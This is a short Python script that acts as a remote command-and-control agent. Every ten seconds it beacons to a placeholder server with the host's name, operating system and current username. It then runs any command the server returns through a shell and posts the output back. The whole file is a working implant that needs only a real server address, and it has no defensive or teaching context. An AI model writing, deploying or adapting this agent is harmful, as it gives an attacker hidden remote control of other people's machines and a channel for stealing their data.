import time
import socket
import platform
import getpass
import requests
import subprocess

SERVER_URL = "http://SERVER_IP:5000"

AGENT_ID = socket.gethostname()

def beacon():

    payload = {
        "id": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "user": getpass.getuser()
    }

    response = requests.post(
        SERVER_URL + "/beacon",
        json=payload
    )

    data = response.json()

    task = data.get("task")

    if task:
        execute_task(task["command"])

def execute_task(command):

    print(f"[+] Executing: {command}")

    try:
        result = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT
        )

        output = result.decode()

    except Exception as e:
        output = str(e)

    requests.post(
        SERVER_URL + "/result",
        json={
            "id": AGENT_ID,
            "output": output
        }
    )

while True:

    beacon()

    time.sleep(10)
